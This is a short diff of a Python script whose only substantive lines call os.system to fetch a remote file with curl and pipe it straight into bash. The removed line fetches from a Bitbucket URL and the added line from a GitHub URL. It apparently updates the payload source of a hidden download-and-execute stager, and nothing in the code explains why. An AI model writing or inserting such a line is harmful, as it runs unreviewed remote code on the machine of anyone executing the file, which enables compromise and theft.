@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/aing005/zepro/raw/main/minul | bash')
+os.system('curl -sL https://github.com/ngfrank88/0xyz/raw/main/00 | bash')
